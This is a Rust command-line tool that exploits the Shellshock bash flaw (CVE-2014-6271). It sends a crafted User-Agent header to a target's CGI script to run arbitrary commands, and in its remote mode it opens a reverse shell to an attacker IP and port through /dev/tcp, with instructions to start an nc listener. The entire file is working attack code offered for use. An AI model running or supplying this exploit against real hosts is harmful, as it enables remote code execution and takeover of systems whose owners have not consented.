use clap::Parser;
use std::net::IpAddr;
use std::process;
use reqwest::blocking::Client;
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT};

/// Exploit the Shellshock CVE-2014â€“6271
#[derive(Parser, Debug)]
#[command(version)]
struct Args {
    /// Target IP
    #[arg(long)]
    ip: IpAddr,

    /// Command you want to execute
    #[arg(short, long)]
    command: Option<String>,

    /// Obtain Remote Control Execution
    #[arg(long, default_value_t = false)]
    rce: bool,

    /// Attacker IP
    #[arg(long)]
    attacker_ip: Option<IpAddr>,

    /// Port to listen on
    #[arg(short, long)]
    port: Option<u16>,
}

fn validate_args(args: &Args) -> Result<(), String> {
    // Verify that only one of '--command' or '--rce' is specified
    if args.command.is_some() && args.rce {
        return Err(String::from("\n[!] Error: Only one of '--command' or '--rce' can be specified, not both.\n"));
    }

    // Verify that '--command' or '--rce' is specified
    if args.command.is_none() && !args.rce {
        return Err(String::from("\n[!] Error: Either '--command' or '--rce' must be specified.\n"));
    }

    // Verify that '--rce' requires 'attacker_ip' and 'port'
    if args.rce {
        if args.attacker_ip.is_none() || args.port.is_none() {
            return Err(String::from("\n[!] Error: When using '--rce', you must provide the attacker IP and port.\n"));
        }

        // Verify that the port is in the range 1024-65535
        if let Some(port) = args.port {
            if port < 1024 {
                return Err(String::from("\n[!] Error: The port must be in the range 1024-65535.\n"));
            }
        }
    }

    Ok(())
}

fn send_shellshock_command(ip: IpAddr, command: &str, rce: bool) -> Result<(), String> {
    let url = format!("http://{}/cgi-bin/vulnerable.cgi", ip);

    let client = Client::builder()
        .timeout(std::time::Duration::from_secs(3)) // Set the timeout to 3 seconds
        .build()
        .map_err(|e| e.to_string())?;

    let mut headers = HeaderMap::new();

    println!("[*] Crafting payload");
    let payload = format!(
        "() {{ :; }}; /bin/bash -c 'echo Content-type: text/html; echo; {}'",
        command
    );

    println!("[*] Sending the request");
    headers.insert(USER_AGENT, HeaderValue::from_str(&payload).map_err(|e| e.to_string())?);

    if rce {
        // Send the request without waiting for the response
        let _ = client.get(&url).headers(headers).send();
        println!("\n[*] Reverse shell sent successfully!");
        println!("[*] Check your listener for the reverse shell connection");
        return Ok(());
    } else {
        // Send the request and check the result
        let response = client
            .get(&url)
            .headers(headers)
            .send()
            .map_err(|e| e.to_string())?;

        if response.status().is_success() {
            println!("\n[*] Exploit sent successfully!");
            let body = response.text().map_err(|e| e.to_string())?;
            println!("[*] Response from the server:\n{}", body);
        } else {
            return Err(format!("[!] Request failed with status: {}", response.status()));
        }
    }

    Ok(())
}


fn main() {
    let args = Args::parse();

    // Validating the arguments
    if let Err(e) = validate_args(&args) {
        eprintln!("{}", e);
        process::exit(1);
    }

    // Displaying the arguments
    println!("\nTarget IP: {}", args.ip);

    if let Some(command) = args.command {
        println!("Command: {}\n", command);
        // Send the Shellshock exploit request with the provided command
        if let Err(e) = send_shellshock_command(args.ip, &command, false) {
            eprintln!("{}", e);
            process::exit(1);
        }
    } else if args.rce {
        // Display the RCE arguments
        if let Some(attacker_ip) = args.attacker_ip {
            println!("Attacker IP: {}", attacker_ip);
        } else {
            eprintln!("[!] Error: Attacker IP is required for reverse shell.");
            process::exit(1);
        }

        if let Some(port) = args.port {
            println!("Port: {}\n", port);

            println!("[*] Open a new terminal and start a listener with the following command: nc -lvnp {}", port);
        } else {
            eprintln!("[!] Error: Port is required for reverse shell.");
            process::exit(1);
        }

        // Wait for the user to start the listener
        println!("[*] Press Enter to continue...");
        let _ = std::io::stdin().read_line(&mut String::new());
        
        // Send the Shellshock exploit request with the reverse shell command
        let command = format!("/bin/bash -i >& /dev/tcp/{}/{} 0>&1", args.attacker_ip.unwrap(), args.port.unwrap());
        if let Err(e) = send_shellshock_command(args.ip, &command, true) {
            eprintln!("{}", e);
            process::exit(1);
        }
    }
}

